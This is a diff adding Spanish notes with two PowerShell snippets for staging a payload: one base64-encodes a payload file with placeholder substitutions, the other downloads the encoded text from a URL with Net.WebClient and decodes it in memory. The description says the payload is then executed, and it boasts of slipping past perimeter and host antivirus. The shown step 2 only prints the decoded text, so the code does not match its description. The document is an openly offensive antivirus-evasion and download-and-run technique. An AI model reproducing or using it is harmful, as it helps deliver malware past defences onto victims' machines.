@@ -1,0 +1,23 @@
+-----------------------------------------------------------------------------------------------------------------------------------
+Paso 1 - Save ps1
+-----------------------------------------------------------------------------------------------------------------------------------
+$path = "./payload/en/claro.txt"
+$file = (Get-Content $path) -join '_CARRET_' -replace "#","_HASHSYMBOL_"
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($file)
+$encodedText =[Convert]::ToBase64String($bytes)
+$encodedText > encodedPayload.txt
+
+Descripción:
+  -  Parsea el código del fichero sustituyendo los retornos de carro por identificadores "_CARRET_" y las almohadillas por el identificador "_HASHSYMBOL_". Tras esto, se convierte en un string con los bytes en Unicode, y de ahí a un string en base64, escribiéndose en un fichero llamado encodedPayload.txt.
+
+-----------------------------------------------------------------------------------------------------------------------------------
+Paso 2 - Save ps1
+-----------------------------------------------------------------------------------------------------------------------------------
+$url = Read-Host -Prompt 'URL'
+$encodedText = (New-Object Net.WebClient).DownloadString($url)
+$decodedText = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encodedText))
+$originalText = $decodedText -replace "_HASHSYMBOL_","#" -replace "_CARRET_","`n"
+$originalText
+
+Descripción:
+  -   descarga el payload codificado en memoria, lo descodifica de base64 y sustituye los identificadores '_CARRET_' y '_HASHSYMBOL_' por la almohadilla y el retorno de carro ('`n' en Windows). En este punto tendremos cargado el payload en memoria, listo para ejecutarse. Finalmente, el script ejecuta el payload, habiéndose bypasseado así al noob del antivirus perimetral (y seguramente también al de host, si es que no analiza la memoria).
